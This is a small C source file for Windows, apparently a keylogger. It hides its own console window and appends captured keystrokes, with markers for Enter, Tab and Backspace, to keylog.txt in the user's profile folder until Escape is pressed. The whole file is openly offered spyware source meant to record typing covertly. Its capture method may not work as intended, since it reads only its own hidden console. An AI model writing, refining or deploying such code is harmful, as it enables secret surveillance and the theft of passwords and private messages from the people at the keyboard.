/*
  gcc -o logger .\keylog.c
*/

#include <stdio.h>
#include <conio.h>
#include <windows.h>
#include <time.h>
#include <stdlib.h>

int main() {
  char PATH[MAX_PATH];
  snprintf(PATH, sizeof(PATH), "%s\\keylog.txt", getenv("USERPROFILE"));

  printf("%s\n", PATH);

  char capture;
  FILE *file;
  time_t t;
  t = time(NULL);

  HWND window;
  AllocConsole();
  window = FindWindowA("ConsoleWindowClass", NULL);
  ShowWindow(window, 0);

  file = fopen(PATH, "a+");
  if (file == NULL) {
    printf("Error opening file!\n");
    return 1;
  }

  while (1) {
    Sleep(20);
    if (kbhit()) {
      capture = getch();
      switch ((int)capture) {
        case ' ':
          fprintf(file, " ");
          break;
        case 0x09:
          fprintf(file, "[TAB]");
          break;
        case 0x0D:
          fprintf(file, "[ENTER]");
          break;
        case 0x1B:
          fprintf(file, "[ESC]");
          break;
        case 0x08:
          fprintf(file, "[BACKSPACE]");
          break;
        default:
          fputc(capture, file);
      }

      if ((int) capture == 27) {
        fclose(file);
        return 0;
      }
    }
  }
}
